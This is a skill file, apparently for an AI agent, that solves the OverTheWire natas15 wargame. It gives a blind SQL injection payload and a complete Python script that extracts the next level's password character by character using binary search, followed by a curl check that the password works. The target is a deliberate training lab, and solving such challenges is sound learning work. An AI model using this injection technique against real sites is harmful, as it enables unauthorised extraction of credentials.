---
name: natas-15
description: >-
  Use when solving OverTheWire natas15: given natas15 credentials, exploit the
  blind SQL injection in the username existence check to leak natas16's password
  one character at a time with ASCII(SUBSTRING(...)) binary search, and print
  it.
---
# natas15

Solve OverTheWire **natas15** and print **natas16's** password.

## Weakness

The form checks whether a username exists by concatenating the POSTed `username`
straight into:

```sql
SELECT * from users where username="<input>"
```

The page only reveals **whether a row matched** (`This user exists.` vs
`This user doesn't exist.`) — a classic **blind SQL injection** oracle. By
injecting a condition on the `password` column of the `natas16` row, we can ask
yes/no questions and leak the password one character at a time.

## Approach

Inject:

```
natas16" AND ASCII(SUBSTRING(password,<pos>,1)) > <n>#
```

- `ASCII(SUBSTRING(password,pos,1))` is the byte value of the character at
  `pos`, so the comparison is **case-sensitive** (no need for `BINARY`/`COLLATE`,
  which error on this DB).
- The trailing `#` comments out the `"` that PHP appends, keeping the query valid.
- Each character's code is found by **binary search** over the ASCII range
  (~7 requests/char instead of ~62). A code of 0 means we're past the end.

## Run

Inputs: natas15 username and password. On this setup the natas hosts are only
reachable from the user's desktop (machine x1c), so run the script there.

```bash
python3 solve.py <natas15_password>
```

`solve.py`:

```python
#!/usr/bin/env python3
import sys, urllib.request, urllib.parse, base64

PW = sys.argv[1] if len(sys.argv) > 1 else sys.exit("usage: solve.py <natas15_password>")
URL  = 'http://natas15.natas.labs.overthewire.org/index.php'
AUTH = base64.b64encode(f'natas15:{PW}'.encode()).decode()
EXIST = 'This user exists'

def match(cond):
    username = f'natas16" AND {cond}#'          # trailing # comments PHP's closing quote
    data = urllib.parse.urlencode({'username': username}).encode()
    req = urllib.request.Request(URL, data=data)
    req.add_header('Authorization', 'Basic ' + AUTH)
    return EXIST in urllib.request.urlopen(req, timeout=30).read().decode(errors='replace')

def code_gt(pos, n):
    return match(f'ASCII(SUBSTRING(password,{pos},1)) > {n}')

# controls: first char's code is > 0 (true) and not > 999 (false)
assert code_gt(1, 0)   is True,  "positive control failed"
assert code_gt(1, 999) is False, "negative control failed"

def find_code(pos):
    # binary search the ASCII code of the character at `pos` (0 => no char)
    lo, hi = 0, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if code_gt(pos, mid):
            lo = mid + 1      # code > mid
        else:
            hi = mid          # code <= mid
    return lo                 # ASCII code == lo

pw = ''
pos = 1
while True:
    code = find_code(pos)
    if code == 0:             # past the end of the password
        break
    pw += chr(code)
    pos += 1
print(pw)
```

## Verify

Confirm the recovered password authenticates to natas16 (expect HTTP 200):

```bash
curl -s -o /dev/null -w "%{http_code}\n" -u "natas16:<printed_password>" \
  http://natas16.natas.labs.overthewire.org/index.php
```
